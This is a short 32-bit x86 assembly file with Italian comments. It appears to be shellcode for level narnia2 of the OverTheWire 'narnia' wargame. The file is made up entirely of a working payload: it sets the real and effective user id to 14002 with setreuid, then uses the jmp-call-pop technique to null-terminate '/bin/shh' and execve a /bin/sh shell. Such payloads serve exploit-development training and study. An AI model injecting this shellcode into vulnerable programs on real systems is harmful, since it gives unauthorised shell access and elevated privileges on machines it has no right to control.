bits 32
SECTION .text
global _start
_start:
		xor eax, eax
		xor ebx, ebx
		xor ecx, ecx
		xor edx, edx
    
;eseguiamo la syscall setreuid(uid_t ruid, uid_t euid)     (numero 70)
		mov al, 70
		mov bx, 14002  ;(id di narnia2)
		mov cx, 14002
		int 0x80

		xor eax, eax
		xor ebx, ebx
		xor ecx, ecx
		xor edx, edx

		jmp stromboli

topolino:
		pop ebx              ;ora ebx contiene l'indirizzo della stringa '/bin/shh'
		mov [ebx + 7], cl    ;sostituiamo l'h finale di '/bin/shh' con un carattere 0x0
		mov al, 0xb          ;codice della execve

		int 0x80

stromboli:
		call topolino        ;la call pusha l'indirizzo della stringa /bin/shh sullo stack
		db '/bin/shh'
